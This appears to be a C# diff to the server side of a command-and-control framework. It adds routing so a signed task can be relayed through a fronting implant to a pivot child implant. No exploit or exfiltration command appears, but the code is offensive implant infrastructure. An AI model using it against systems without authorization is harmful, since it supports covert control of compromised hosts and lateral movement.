@@ -51,6 +51,19 @@ internal sealed class BeaconTasking
     /// verifies against the CA it already trusts before executing.
     /// </summary>
     public TaskRequest BuildSignedRequest(TaskDispatched dispatched)
+        => BuildSignedRequest(dispatched, fronting: null);
+
+    /// <summary>
+    /// The fronting half (architecture.md Sec 5.2, the Pivot class): when
+    /// <paramref name="fronting"/> names a stream's implant and the task
+    /// targets another -- a Pivot child the stream fronts -- the frame is
+    /// marked with the target's id so the fronting implant knows to execute
+    /// on the child's behalf. The signature still signs the target's own id
+    /// (Sec 9): the tuple's executor binding is unchanged, the marker only
+    /// routes. A null or matching <paramref name="fronting"/> produces the
+    /// ordinary own-tasking shape, byte-for-byte.
+    /// </summary>
+    public TaskRequest BuildSignedRequest(TaskDispatched dispatched, ImplantId? fronting)
     {
         var request = new TaskRequest
         {
@@ -66,6 +79,8 @@ internal sealed class BeaconTasking
             request.StagedBytes = (ulong)stagedBytes;
         if (dispatched.Nonce is { } nonce)
             request.TaskNonce = nonce;
+        if (fronting is { } stream && stream != dispatched.ImplantId)
+            request.TargetImplantId = dispatched.ImplantId.ToString();
         request.Signature = ByteString.CopyFrom(
             _ca.SignTasking(dispatched.ImplantId.ToString(), request.TaskId, request.Verb, request.Arguments, dispatched.Nonce));
         return request;
@@ -77,6 +92,14 @@ internal sealed class BeaconTasking
     /// </summary>
     public Frame MarshalFrame(TaskDispatched dispatched)
         => new() { Payload = ByteString.CopyFrom(BuildSignedRequest(dispatched).ToByteArray()) };
+
+    /// <summary>
+    /// The fronting marshal: the frame for a stream whose implant may front
+    /// the task's target (architecture.md Sec 5.2). See
+    /// <see cref="BuildSignedRequest(TaskDispatched, ImplantId?)"/>.
+    /// </summary>
+    public Frame MarshalFrame(TaskDispatched dispatched, ImplantId fronting)
+        => new() { Payload = ByteString.CopyFrom(BuildSignedRequest(dispatched, fronting).ToByteArray()) };
 
     /// <summary>
     /// Records the dispatch (architecture.md Sec 11). Dispatch is server-driven
